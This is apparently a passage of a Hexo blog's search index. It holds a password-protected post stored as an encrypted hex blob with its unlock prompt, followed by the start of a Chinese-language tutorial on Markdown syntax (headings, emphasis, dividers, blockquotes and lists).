e35aead3a0c777c9a22cacbb3c649870b44fc188931ff3ede1db24137af75d8aba0173b869e82953f44f8e7c6df9f9f5dab422d4364f07ecc622e8a182cc9b6e20018f4e92429e6d6da73493bca4167d40c3081f8edd4927042dc057e6da88757401c37d9b2cda4797b7353c9334e53dc31f4e82122d55c43eac0790a72e1a6cab3ababc65b10e672efb85bdfb3214f33ba343f9c84d4100978d0af90edc37e79bfd15c7b5585ecf3f5dc25dfe786efee0bb735579c10dc36276d2dba51c39ed1723671d5c9c5393106f6f39c2f1b197ac0df528531eb25baf926be20ad369c237233aab6ad9a7495a6e6fb2b9d5abae72dc60485f32740c9b3b96a2724a8e80b44072b1ed607fac9fa24cb40d06a365659e214872dba2bec9859923ab9fbf1fbae92b09282ecd4829eece240219405f2750e636e3f712ae2b28ddc3a4a8a6afda22aa6a0d08447ee13acb0465483c34b9c0d187fb584b0a850cf75b066419ed53c0c3f036bc4756c43847db4c0ed483ebd026a2e8258b0a2134bf1e0276e8ce12c7a5460b9438d7adee9d66a995ded600428d4994453751ad2e2e1700137f48638b9344cafe219964032304f43bdd501df443f5bde8e4b1c50a58e4a41110cae63988c0c813dc8ea58006c244bc23917a58a6eb7cc1b7f91cf0282e2ddbb899ec37c687910e892d405b8d43dfeb0b4a5477627f28027d2e9719468d794660692183da7c106361f421e51e950c95af90c4b39dbeca933e63331f2476c98fa7112bc42b2dbc678233d412940962eb35541315e9fbd027a53e79403b2759c4cf83da4f5760d6b114673817c96173099aea98a9ad063d1244bbc9ee9f75f166f2107a53fef3ae71aa25a9658d5b4d68ec4c0be7a6676e341da25f693b4800d2b48b94126108fc88897031598557bf46d39c3f2562aba6856e18030b6197a12996847ae90160356168f0c41a84cafe645a2fa89458f35ec1d7ca31ee5a31f93a9d2ba851e0c0815a377f7868a878b65eccdfe92793fdb47336b0dbfe75df2f594e3db4aa28a9b5b0223fa9929a7f9232c68e751abfc11a7d408bafa4f306802b45f1f061104be7831658e740a746725b42eae23dd95fce2373cf6e59eb30937ee4f98bcdf17746ae2303bdb1bf52af9604e1acf04a376ad356daa9168bca7919273a5d110828fa50bdedd9f978da5d0478ec609a54cb3c8c5887a9bec909842ed1600f67b401a1cbbf4e19f3ed4a8dc86fc9f90da18913c6d0a302b9f74c6a3dceabe81f2667610eb719b0e9942e0502942c3621488bad303c13bc254383ce1a781b40ff6300509d2d11d2910bd6fae40272e639bf28619f91f9e41c267f19111743849eb9dfdb0d45dc4d43d6b9f618ddcc034f682686a5c789a25f910de7151d8b910b06f35b0c24599e1217632392730ad2adcc6c3a96b7867757c0dd1e023612d833fd4cc2a5a0aef083cee42a10c0e478a24504b5acb64e8db7567cd9e5a17e7cd66d302256d8eccea7aed73480397aff06c36975c0522ae55fa14f9180816128cb146b9059724a9b1eafa4eef34c38cae8a6e107b24ea356146f1589937c61fe81e6e19f3e1d9df0b9ba1b69ef597d7e1015a81545fcf8adca125a23b506ab9480ef5c1e39968599a4f2abada05935fce6dcc0a272e5f1d47ab73e57d92f689d6e42e0b7f9c2354b5514ccec15051a6e81a829ae7b1d8d95165ddd6387a0f35a558f02405161a6e7826b0c805a2eca3a53059daf983ab1a70a70afd65c177ba2a55a4a95400c1fe1fb1dc388ef22cf562a73feb4a9137cde96a4f9d16c49b386d6c85989a1a64cc30a83655dba6cf5cfd9dd9d4f914843977305b1ae6523e7d4fba644726563af51e16ae50e3645d45a8ea8abf34a7bd141d01729486fe60c1bb87d2cd9956818fe6dc5ad3dd5e2d043f5038fb0280f5b4103633f98db50195f76e875b5257fd16104b03ae7b95ce5d56c2597732c7ad2d43b94c4e8d84db0f3250f364d8ba614f8e419cf249f8305b4fcf52fd48c3e493c4c523c9b7ed3a25d36f6ef71a54c86a467d9fa59dd09b16102ac6abfa1f308de170909deae773c495ae2265fbee4bc5246860ee6de6b46ac3b02445e1043edb4e21b27ee3730620e739e8bf5d46458dfae38b5b4b311e4d2c596b96d966f74f1de56bddf9959f6533c8faaec9e6a7b307dba626fd6121e8276985d2858a0d8a114aec416a69aa664f6a807280393192716972773d344ac6059cbd0d9a94a491bbce23f0395802ce8ceb676c5c35792b9cd7c87b2f39370f42606afcebe3dd7ef588d00287f0824c00701227af610eb32f246c46884f50f30bb95447115397177b665f265f293021bbf013f47e4da5f8988c3f4ec75a319e7deaa7911ad632d032295d7d581baa7bdc1d4d40443d678d2da0274f1243854785ff697ddf5daa8adb0e6be4c60d9594aee77478794688ebb935080ea81c1feddfaf16157bb230018f6b48fee92252900bcca6e0423a050636c0f09f090589297f2a82042d06ef0800ea1527e3c41cd331973d3e8392e7d6177a397b75f3fdc4fd2dd9bd06cd0e0937d2a5363952ae7205143fd73548e0e67ad8dc1e5dc9fdf0742024dae921a76534bfa07ea5f6bf6eb3d10f822224cd76b59658b76800910d395633f94a3ab3dfc5896ce223aece48fffb6d44c50b9b110be4be66700e550204118bc26f98822f05968d4735f4e1ea95dcfd7fdc2fa9c95d0077e9a6e3f2a013ef59d788ad4f9472605b97a26dcff661b05fbe3826e6bcfb9a15a90217c9913d750b92675689cc120a47a60f1329b6d2007109331018d74ab7a13aaaf7bc12524ef7fe7614b50e0c706ef8fb667e87542a2f734520a92797db0a023e6f68ae2912985ee9f146970760d7d2f14804dbcde11906699b1ac94392227223d1fdb6137e678cefb8b8c5e3b64e3927488e02a9de045886f233a2aa5803239c53b69f6926684ded0d55bbe7774f3eca3ba870484c5862e506186eac281ea9ed4620ac0f42e46fe7e506569fd1a8ecaf7246e3a2a325f09ac562a131f2b8490af371b1c6e2008ee59e5ba00f710b4b817f61e4c91002b044e5aa90059cfee99ee0d05464acec9589775ece24e539ab6ebcb902bf99e679a26d082fa4904d92776fa439713f5567299c84c2c203de3cba476afb3a38fb2925fd54a77d43514860ef24c77c1e4563b4d7906396040fd30e4534c04f9227af6da16766261794e1f38e5659ff83da863baa9a2a1590277a0da5652a5e85d59c79106c0a8f92379eda619f2157bd9b15e025cbfcb397968177f099f8f9c6278dd71e548991dd63f265076b768b88d8ab07c0c371d9269e9936d2289a2a100b9132938ba767343e92e5e8916f9016024ad4a1475875ae5c51879f3274a9598cecf0b8ac2e437eb0ea8dce1bc40b25bfb93c85f2ffe4ff17e77a6866abafa1a69560d04138d412d86afc02d1a1237e33d73fdcf6c25a078d7a4013cf82bbf71556a193025bf18d9911b4e10133d64b71a600641bc1c639caeefa4f02bd363b08ad98ccac698b8d6ab7845dc7e33b480bc817fa93c5a91b9fbef28d4ae71f2bddfe6295d96c6894da1c79a1c876be210d51e50293a4525055cc7844bef10393685031ba6f0eb9f21fffc3839e9a5bf48d664a1f362370b69f29791239c4e055f8d58f3aa38cd596fe7b298b9f05b6fdaaeeaa7c66168fa0a63cee87b8fed412f60d64ebd2cf5227b6ffe5c5c8c450db9bb7b48faee58fab0f5ec31a05011e9516a31696b954fd43f222a3f4b0aa470b5778d2d9d159e52801b03fc0a2d849fd4dafb2553198ca516b2e2bb208c452289ad9a8446d615df0e6c8b01e7d00fd2dc1527c642acdf7a3ba58b87ad700402c762a93e659f6cd30b49671dd717dc76d55a55dec7d8224feb8e21caa6371ff39d7aa9368d1239ebe6e0d0e9038752f143e695811b1093fe32dce7f7d743184a384ac68a2b0e34da64d3894ad385f649e90016bd618e92dc4ad08f5709ea3a5428931a61739c21e63f7ab8399cc21f6eac69045d6b517c774652adc055f1145a836af1db3866cd7c5b46971878c521f98fff8b09931a95a8136e2df40e828c72287220b1214bb70c94b1f914dabec5f6ca436a1114385b31437e1cb8c7754eff08c47af7037a99d1bf027d7959331d51cee067840cccdb2869f880178a8cf0cc8a07d23799dc365184e299a71d4d2207ffb99bb3cc3277b796840b6322ed762b8939ac671c93277d851acb4290208c62ba72e803c431843c3b5a5d7a7b026c18c379ac3ba6620ad7b1e1730c14396480c9a1d9d519d53d0aa6ef714230f3ae29a207bd3f3c927dd0b489ad29960ef41649e902ce25399818913e1a31ee45c52627bcda9b585bad1e19641729f154f289439fcd1b9c141f9928f23a36f4d8396c591362c4109d8e08074195775df99c495f9f888e03befa24af3291ab643165053f6710ac84818512e94afbe56feb358d49d74e95c04b25c8f853bcb3eaab1f97973700775bd9d9f0eb8b166b5f0f30cea3e2e1eabb6bbbe19670761dc279c991c2d54ad59f9f9b9f60beb9447d00157fe45076597d7287cdaa9cadfccc811d7de196e7659738487e4978a16e7e1a682b7cf9391fa1d8c19f55d7e31b4e7c9a7dfc98c780661f1c82effa5a0e386ac0c7ae2bd10d4f9c249949e0847a9aced85efca8ce3d03cea5c55821dd181344c5143c5f8f9f1f965f6f55ea2cfe2cc2ffc816da35cceca67c6c21168402c8a0bd7a6ccf544d268541e918d0a5c8d14b61af212f5cccb2597632441c234044f4fe2c2d7c7fa52a9360f5e25d84e9c32ff80eec7737acc972c19aa5b1a491eba5fb281b93911f2b0033f03951a47917c8880077e014451f633b5a9b81183f3e656e014b6511ee70577b45ea8c3cf1e7cc8b578ed956279c5e7a3206bfd3b80c82a59f2c5374b2e7c21f11ead22dc5068ea3ee67aac9602c238e6dd5287343c45ae47da14b783a158ee3d9a5fbf61cfc9c91a4024c91d939135d45db903b6ad9186dbdc3d14ce50827230b041c0ad1e0efe96a24590a806868b5025e4daa5d6df16dd80ab04eb19ed97532bf00de4314d5f6743fc42d0f19a8e2e0d0306cdee40425b672f5ad8b1928be5e33e279d432cbcee471c9a89033e14cb3a1aaacd7e1c5f5e351c07f3075b4d1117a7d442d745800def1e75097bed012a03e6190bb9810d4f37c43460d1aee4d195189f1d52c70f4ab7902f22d7dc9328f7836af4cc7d869a0626ca2fb6a99090b9e861eb1567f76cdcde36cdb8c1870058b8de5227e905651bbb582c28a43854d16fbe4902a69cd6e80e8ef7d885dea19a90d1d69e320f6e5d3d05930f46f46bd911e42d1e973d2cffdb72d42a2bbd9fa90f4bf270f715a03a349749fb53f53f861db810fc23de23e1511277b3f8e8d2109cb719489be81ff67aea78d3e79559f7482649d42965e02977d602311e62997c0e582acecb724ee83f67d98e7cdd4f551c13512a677d3960a22bad9a8c22e5b7b354aec5e6ad4ca3017ededd1043ed717b600f63c36d9424353dafadd1464d9dd74fc4a82bf7f87b9f02e7fd46d021b5b6a7037dfa2d4a08b79028393a51f375babffb9ec4875bfd473fe1ebc89de387b9119fdc27be9b69bd833d0060ba81355f2a64f0f98e8321e94d867477fb82cee43da5b857be57558b9594c2d45bf8c91de80d28867bd169c344dcf9d4cd3b532edc49b5c4ad1333bb75ba2ead24eb8a3841d8314e836c7434fc142c81c99c9ef6880b4b3f1206883ec0f7b505a7536f33c72f0f46d53d471b453f3b98f5215b13198de23d86c99ef3569c6117cd43e69c4ae1e90bc22ef3eb17cb99e96da8c50e71ca668fe8accfc7566e13e8948be64053f661246c8bf42c93f431d6305059abc6537f9e7b2390f7943ff7d63f5844e66f9845f2535596be2b3efc4a0d7b14889df9bd12b00251ee99e906bd4e5cce972079f9d9472c28a547c545aac6c9e4e3e2dca0e1c0bdbb99580f07568b1631fae029ed18e71a31f5c85dc4aac595c2fe4b3178199b4862d4752fbe2c96cbbed0e881b6e1ab874176947b32a74a57f3b66f410bc6155f0db2b40eebc9f5e8535e06fdb2adf7c066092ceef350907254964bbeb24fd8dde395ec7f3361d1bcd8b96156ee23502f2085e487e14c2398cb7ea34c232710aa2ea67107245db071598bf333985c7931e2db5c04868c944294eb3e291f9b6ae18a0d81936e0423a0946d480cab272a10a682321a5fc854eaf89c8c2bed76843c348e5faad94b3a7e9feda0eac41dbb0b3586e94b14dada36bc47a923fa3069bb79f5e0842a2c72bdaa10625bfede8f2bcefee971337818390da4463b368b671051178bcdc200e70c6288224693a578c5c20d50d90412fe47cba0e1d008279ed96f71023878f2e30c35e0dc68a1e644c0fa90604c46937c52ec3920e1a2ab230ab2b8c183fc07a8ab452f80f5f9be53e933af9f286af712c8ffa37686174c8a8dfea9373fa16c37bd9393d540922263be16972e317dc3cb79ebc16a8101cebfa680414b0267d3b962dfdc4047194ee3cb1fa13efc4e9c6d7867538da80a9477bd34fba6a7c0b95e289bd64238306a2105dd7c01c39b07ba87f14b6524c715621b70152b3548f550a6e0c6eafa36a27d2f5025c5fff94c012e0513fecf92e1431fb4de5988c7467f8e16749fccb37d0efc47299ed2f57d05b056cb1ce70d5bf79cfaad0c5f39882d0497d9f2881a39b64568412b4526ae7a38489da3a8b25251ab15e6a94066e38f252eeea08b32d8a3cedac2613c43fb27bad03eec10dea2e6cad2055a4e4c91173a1d197257342695c1596d7136008949b4df4ae2548ec79982cda2641a07efcc66389eb1a142c6936c66e0700e39bbaca7f2bfa6eef6f6d2d8a939ab01be7a5520703a5a4a3a4fd42af93be8c8db53d10e15d4c78f7a347c8fa95d3f892a8e91bc43f9d37766bf4277513ce451bdbba64ed65008bb9db2554c8bbdbd704b29a5b8a51464fafea693b2601697541a9a5636b677393d908b5c4bdd2cf66333536923c77a4650375fa2227a6f29487650ae228e47667ac9b132938688862695df83780c19717cefd66d527589006ac7fe7f08cc4ba905086e8ac803788dbe867453a6ce55b0e570fa7424d8184c504ed20ae35331d453d5590cf23b9e63caa2173cadc06c97356018b164b10ca709387f2784b6937c4bbd1e4cf5556fdf3919260f7c09c7f549e9fadc22d9515b69075515c9ec76f4f4e51eb390429b8d603720d381c89d0735c4f40c4286820abfb30850a9c58447586aefdeb47fe9baa4079009b77ed85bde3d4034943be7169651ea689b2df2ab5f257104b4663a5fbf0fd3fc21c3262fff1f3172cbdf5e394ccc9b79ffa5d61ffa3b03c3e82ea4c6a815bd105cbb22e86b78eeea50b16bbd17377dc5c513f701f3fee576a201daa13823c864c32b26e669e8880968b67772b6300e168e3d41ae26b952334e4f4b3f3fa45d4dbd39312ef80a3dd7e9f049c333d88cf24673cd4eb6351e69ba6ab9d2e3459e8c08a3587465f60434c195672d050606d2c4f9a8e588f389c894dd65230f21bcd3f1996ac95c3d45b333c069ee317b337f02af86d805f696bf30f67c3f564725f4eca833724e8559e9d2ed65a72148186a5c66c4c6d68c501fa47d9f21ea5b6497f39ca6450d6c78f068412d443637f5d4baae00b78fae3f06bc7a9eec8e99bb60fa252f9554077b56bce83ab1c36f26cc3491e61c395e346f34ac658d36d2f96d86a2378fc426deca58ee992d5238fec2a6d07492c39e8ab6a0a13d93ed3175c76cd5d87c00b7c52b07b036fbf88002a69e5957318c740784102aee1ed1cac0e7a4296accf1195bda97ef3c6d03bf720943b8ef7c486151e801c06992de34f1f338d5f735b218b7b3305b784dded9ba470b739444a98ade7efb3838f87565167cc827a942325b358cb3860c6910e51c706be7806323a22af1a20d8a547196ad155ba1b917868e0bc9a2b5557edca226e5a802dd80cb8a7ff3f3123d8991c1f7b1338af44a17e964697971d7ecf5f4b2a82429fc68146216929da8569cac6f30e5a4f81b19457dd033a18fef9b659a8f6d52c22422fb555fb5c3fd9e75415cfafd6e2ebc7ae27b4b606b519397898f7ccb9ee5d66659f984613d3a60a9e2dfab11a6e40875335decd5b07abca6bdb948a09659791d93d79cf7f6fc30bce5e3514bc1070eae785eff04c1bb8a96b9acf786d86d4367ab6a111f029d27980515c5f4efc0bd5788b911242b7b26eb0abf4f95754ff63adb9bbb56b3a6cab9c6284db032745f7023d114c169253cf83bad5e80ca538816357cbe3cff81a60b48470615bb6088732d76ac6d6075c8f7a9dff4358a1e360b48295ccc00fb491a50c09ad565ff089d8b14ac863dbce6f5cd52b886047ef0c187a05b036db147522271dadd83b1a83b6b3d8eba992c067f2fb20186715e2a41de522123b17bb4f0e6b5a686bcc5a9910a3703034e313569d7a38d536435bb00494dfb349e02bbf6af2bcd59adf79d19f3790dcce33c43adffdb065742bbc6525d8c12d9707356f3dfd513701803c1be5c5c31e7c7f9f10454052652aaa6093381e6bb48bec9bcf80a089add7f76bdd0baa62a97bc420d3d6eafc35a8e7c0efc3043de27186087ae672b47646126d179851b964f3fe7b001b7b609b1baf6bf6f5307393f3aec16ce38b8d9a3fa919375fae5310b3cfd89f5c0ae6ab8027718f63092fc9ebf6e0218eb028418c91db2b373a72ed74788824288ea634c877562bca9a8a3db7090db12df434f180f537409bb53334d5def50279cbd516c9c50530821da0e518d48dc50a86c93a77243ec84155051d8c877bed3176a171f17ab1006e058b74133f4ce7af49ae70a55ee58d0767230f30b2589a4a7f68e5a6ffd244bfbaec10b8f5b37645d2890897e7b3fc25cce4fa8ca1d9f341f390831ea9712c61da90ad4f6633834a19d5f850e952d18814250be49ff62da98c22c474bfd948717da9658c834280a0f5c4d6bc936801e15bca7c437972f592071d1422864edcd5a86bb4b8bc72463002b621178f5ff0aefbc98069b12a904d587407c8d675dbee90d57013b8250c2cf6459d8a14307d415c72a42e17bc511bc25e6316ca22dfe9635a9ee13b269c051605b841322f6cb415ae16d24276616a83453ccff13a6483c127e2f0c68dce93089f9e9b8f9eb181607ab311aa71f131aa718fa17eae51aec92b0835bba2a89d7912375806acfc5069cf4643b028fcdbbbdf2a4ad32876d4317eff70817834537a68b707db560096a4c8cdb6c2ec5ea5bce2af4107f48c5fe8dfa6347e7f3e38cec5901d1c4c2fdb6348153b97e5445767d9bbde4ee1d197661222868233df0f536731b90dd3f3a8af1cdd2f7cd7153157c01fe241443fed4757534c2983790636917cb681ee08f6dbec8d41351d6e36edcd5c21ee6394984859aab93b8a31f9108483985ca889c84e5ae98d11215f65dad8fe70cedbd93c16e2222aa61ef2bf25b3383c6f1b952c9372e6643320417ad0f657c42208447caa4c1d08b7bad50ecd32a8f08731959f8b83abfe964c6088079444142b05978d59c4188033dc4b214fb9e90a956b4d85f74223655d91ea28a42dedcc5d08124de8c31ce96c5bee94a4436c53b01d7569808a33ae63f4a4b210041effd012c26d88a01413b125f613ab4dd16c31ba5b9425cdaa7436f2bc91c26c04584319147d68be8c6accf7eea22e37f2062e812774e1e52c0a39d4b7f0d3efa69057e8f19371dee43bc0a9d5649f994f53f03d827322f900cb18582ae267369f9aaa0c4d92625d2e7d1ceade9e716dbeaae5480427ababd69c2cc49f82a25bf626fa6f1af319edc060534ac48e387b1525368bef32e4b4da5486baee4e777c1e0cf77341cc9aef50a89a911c51cd71026645449bf11c87c3dc91861da1c38568cc0c9111817fc3b424e652b43aaff968c985c40de2dba39126bdc50e9bef43c68f85b7d0456626877dac5a8248055c9315bf4aa1ace53d9c7cba7e046470eb713f91a64f1deec2640a35d8c30451f9c52f4311ede82fecf13cb5976ba8c47f382335ffbe3926569254ca90e6880b5c094d092f99cca371c0bf5cc9a8905de80aff9a7af46fe0661753092af7d16e2790a2ac867ed86da316b883bea80ab9c3f6dc78c8830db630019df1159bdfbd9d7fdbffc44ca9504ded65c53d3354fdfc490afd5717266d9e36fdffd267395ac67105ae12b7c1ee17772a2c59a01e3515f56262addef74d2107b275697a41f228e5bca46a58dd46843bb3c76a4e3743c554417bd75f80f89e21034cb8d0a15815d9367dd56d425b8c545049e09d3451d5fa96b4bf4e17fd4bba8079c35c5f385ee8555515c05903452551385dae05e0befa64bfb2692fff7bd39e0afa9a79917463637021756b5653d66582c54ef0691194d17783f0374971e1efeed2e5df3ab840ad7b1677377ce0112178b195326116e1d5672aa31abcbf190aaece13e6754a607e7abf52aeb13b895fdde363d0c6f5284ce1a6b6398dedf0a4020591b938ec59a431c51b0adb3328ff3c0a429adb492618bb31e4816ffa50b6e6f0dffd9d5326ae02965d624e444da783620ef243a40a2955469001bf2586dc0311fd8392fef39b983dd28227f5506931a77530416fd6113f5c3f20c5eb0005aeaa61405676a183aa479101e72b374e7d0afccd7e7332c1300fd3c08b604c4528c1c721c1379064bdee608b0c7f253d4fee8cb3c9ce081de4f16e26a626d1bb172f9a5c8293fa928e08bdc296591f78d22e35bc9c890b7f49fb03a80071ef8943c04a68fa98df168668c94da296fece63c7c71c25d76f062b1dd47e3640ac734e6066901e99e6d960187436df338ff12feaaa</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法及原理从入门到高级</title>
      <link href="/posts/417e2c66.html"/>
      <url>/posts/417e2c66.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、Markdown纯文本基本语法"><a href="#一、Markdown纯文本基本语法" class="headerlink" title="一、Markdown纯文本基本语法"></a>一、Markdown纯文本基本语法</h2><h3 id="1-标题"><a href="#1-标题" class="headerlink" title="1. 标题"></a>1. 标题</h3><p>Markdown 支持两种标题的语法，类 Setext 和类 atx 形式。 类 Setext 形式是用底线的形式，利用 &#x3D; （最高阶标题）和 - （第二阶标题），例如：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is an H1 ======= This is an H2 ----------</span><br></pre></td></tr></table></figure><p>效果如下：</p><h2 id="This-is-an-H1"><a href="#This-is-an-H1" class="headerlink" title="This is an H1"></a>This is an H1</h2><h2 id="This-is-an-H2"><a href="#This-is-an-H2" class="headerlink" title="This is an H2"></a>This is an H2</h2><p>任何数量的 &#x3D; 和 - 都可以有效果。</p><blockquote><p>这里需要注意一点，由于分割线也是 “—-”， 因此在使用分割线时，一定要空一行，不然会把上方的文字识别为第二阶标题。原因会在后面的段落和换行中说到。  </p></blockquote><p>类 Atx 形式则是在行首插入 1 到 6 个 # ，对应到标题 1 到 6 阶，例如：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># this is H1 ## this is H2 ###### this is H6</span><br></pre></td></tr></table></figure><p>效果不再展示，但要注意的是，标准语法一般在 # 后跟个空格再写文字，不然可能会无法识别。</p><h3 id="2-字体"><a href="#2-字体" class="headerlink" title="2. 字体"></a>2. 字体</h3><p>Markdown 使用星号（*）和底线（_）作为标记强调字词的符号，你可以随便用你喜欢的样式，唯一的限制是，你用什么符号开启标签，就要用什么符号结束。但个人感觉写中文时还是（*）比较好用，因为它不区分全角半角，不用切换输入法。 示例：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**这是加粗** __这也是加粗__ *这是倾斜* _这也是倾斜_ ***这是加粗倾斜*** ~~这是加删除线~~</span><br></pre></td></tr></table></figure><p>效果如下： <strong>这是加粗</strong> <strong>这也是加粗</strong> <em>这是倾斜</em> <em>这也是倾斜</em> <strong><em>这是加粗倾斜</em></strong> <del>这是加删除线</del></p><p>注意：强调也可以直接插在文字中间，但是如果你的 * 和 _ 两边都有空白的话，它们就只会被当成普通的符号。 如果要在文字前后直接插入普通的星号或底线，你可以用反斜线 \ 。</p><h3 id="3-分割线"><a href="#3-分割线" class="headerlink" title="3. 分割线"></a>3. 分割线</h3><p>你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * *** ********** - - - _________________</span><br></pre></td></tr></table></figure><p>效果如下：</p><hr><hr><hr><hr><hr><h3 id="4-引用"><a href="#4-引用" class="headerlink" title="4. 引用"></a>4. 引用</h3><p>在引用的文字前加 &gt; 即可。 在 Markdown 文件中建立一个区块引用，那会看起来像是你自己先断好行，然后在每行的最前面加上 &gt; ：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet, &gt; consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus. &gt; Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus. &gt; &gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse &gt; id sem consectetuer libero luctus adipiscing.</span><br></pre></td></tr></table></figure><p>效果如下：</p><blockquote><p>This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.<br>Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse id sem consectetuer libero luctus adipiscing.  </p></blockquote><p>Markdown 也允许你偷懒只在整个段落的第一行最前面加上 &gt; ：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus. &gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse id sem consectetuer libero luctus adipiscing.</span><br></pre></td></tr></table></figure><p>效果如下：</p><blockquote><p>This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.<br>Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse id sem consectetuer libero luctus adipiscing. 区块引用可以嵌套（例如：引用内的引用），只要根据层次加上不同数量的 &gt; ：  </p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; This is the first level of quoting. &gt; &gt; &gt; This is nested blockquote. &gt; &gt; &gt; &gt; &gt; Back to the first level.</span><br></pre></td></tr></table></figure><p>效果如下：</p><blockquote><p>This is the first level of quoting.<br>This is nested blockquote.<br>Back to the first level.</p></blockquote><p>引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等。</p><h3 id="5-列表"><a href="#5-列表" class="headerlink" title="5. 列表"></a>5. 列表</h3><p>Markdown 支持有序列表和无序列表。 无序列表使用星号、加号或是减号作为列表标记。 示例：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 列表内容 + 列表内容 * 列表内容注意：- + * 跟内容之间都要有一个空格</span><br></pre></td></tr></table></figure><p>效果如下： - 列表内容 + 列表内容 * 列表内容</p><p>有序列表则使用数字接着一个英文句点作为标记。 示例：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 列表内容 2. 列表内容 3. 列表内容注意：序号跟内容之间要有空格</span><br></pre></td></tr></table></figure><p>效果如下： 1. 列表内容 2. 列表内容 3. 列表内容</p><p><em>很重要的一点是，你在列表标记上使用的数字并不会影响输出的 HTML 结果。</em></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你的标记写成： 1. Bird 1. McHale 1. Parish 甚至： 8. Bird 1. McHale 4. Parish 效果都一样。</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>你的标记写成： 1. Bird 1. McHale 1. Parish</p><p>甚至：</p><ol><li>Bird</li><li>McHale</li><li>Parish</li></ol><p>效果都一样，只按第一个数字来排序，因此第一个最好是1。</p><p>列表可以嵌套，上一级和下一级之间敲三个空格即可。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 一级无序列表内容 * 二级无序列表内容 * 二级无序列表内容 * 二级无序列表内容</span><br></pre></td></tr></table></figure><p>效果如下： * 一级无序列表内容</p><ul><li>二级无序列表内容</li><li>二级无序列表内容</li><li>二级无序列表内容</li></ul><p>要让列表看起来更漂亮，你可以把内容用固定的缩进整理好：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus. * Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse id sem consectetuer libero luctus adipiscing</span><br></pre></td></tr></table></figure><p>效果如下： <em>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.</em> Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse id sem consectetuer libero luctus adipiscin</p><p>有一种偷懒的写法也可以：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus. * Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse id sem consectetuer libero luctus adipiscing.</span><br></pre></td></tr></table></figure><p>效果如下： <em>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.</em> Donec sit amet nisl. 